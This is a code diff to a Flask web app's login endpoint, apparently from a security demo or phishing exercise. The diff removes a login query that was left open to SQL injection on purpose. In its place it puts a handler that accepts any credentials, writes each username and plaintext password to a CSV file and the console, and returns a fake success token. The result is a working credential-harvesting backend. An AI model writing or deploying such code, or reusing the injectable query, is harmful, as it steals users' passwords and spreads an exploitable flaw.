@@ -3,6 +3,8 @@
 
 import datetime
 import os
+import requests
+import csv
 
 from auth import gen_jwt_token, validate_header, validate_and_decode_jwt
 from constants import (
@@ -15,7 +17,7 @@ from constants import (
 )
 from database import get_sqlite_cursor
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 from flask_cors import CORS
 from werkzeug.security import check_password_hash
 
@@ -27,7 +29,7 @@ app = Flask(__name__)
 app.secret_key = APP_SECRET_KEY
 CORS(app)
 
-
+# TODO: venues
 @app.route(f"{API_PREFIX}/v1/venues", methods=["GET"])
 def get_venues():
     cur = get_sqlite_cursor(VENUE_DATABASE_FILEPATH)
@@ -37,42 +39,38 @@ def get_venues():
     venues_list = [dict(venue) for venue in venues]
     return jsonify({"status": RESPONSE_STATUS[0], "data": venues_list}), 200
 
+# TODO: cart
+# @app.route(f"{API_PREFIX}/v1/cart", methods=["POST"])
+
 # TODO(xss, optional): comments
 # @app.route(f"{API_PREFIX}/v1/comments", methods=["POST"])
 
-
+# always login successfully
 @app.route(f"{API_PREFIX}/v1/login", methods=["POST"])
 def login():
     req = request.get_json()
     username = req.get("username", "Unknown")
     password = req.get("password", "")
-    cur = get_sqlite_cursor(USER_DATABASE_FILEPATH)
-    # weak version of sql injection
-    cur.execute(f"SELECT * FROM users WHERE username = '{username}'")
-    #cur.execute("SELECT * FROM users WHERE username = ?", (username,))
-    user = cur.fetchone()
 
-    if user and check_password_hash(user["password"], password):
-        # Payload data that you want to encode within the JWT.
-        # Include claims like the user ID, expiration time, etc.
-        exp = datetime.datetime.utcnow() + datetime.timedelta(
-            minutes=DEFAULT_TOKEN_EXPIRATION_MINUTES
-        )
-        payload = {"username": username, "password": user["password"], "exp": exp}
-        token = gen_jwt_token(payload)
+    # save the user attempts in a csv file
+    csv_file_path = 'user_credentials.csv'
+    with open(csv_file_path, 'a', newline='') as csv_file:
+        csv_writer = csv.writer(csv_file)
+        csv_writer.writerow([username, password])
 
-        response = {
-            "status": RESPONSE_STATUS[0],
-            "msg": "User logged in successfully.",
-            "data": {"user": {"username": username}, "token": token},
+    print("User login attempt \nUsername: {} Password: {}".format(username, password))
+
+    fake_token = "fake_token_for_demo_purposes"
+
+    response = {
+        "status": RESPONSE_STATUS[0],
+        "msg": "User logged in successfully.",
+        "data": {
+            "user": {"username": username},
+            "token": fake_token
         }
-        return jsonify(response), 200
-    else:
-        response = {
-            "status": RESPONSE_STATUS[1],
-            "msg": "Login failed. Invalid username or password.",
-        }
-        return jsonify(response), 401
+    }
+    return jsonify(response), 200
 
 
 @app.route(f"{API_PREFIX}/v1/dashboard", methods=["POST"])
@@ -107,4 +105,5 @@ def dashboard():
 
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    # running on a different port
+    app.run(debug=True, port=8001)
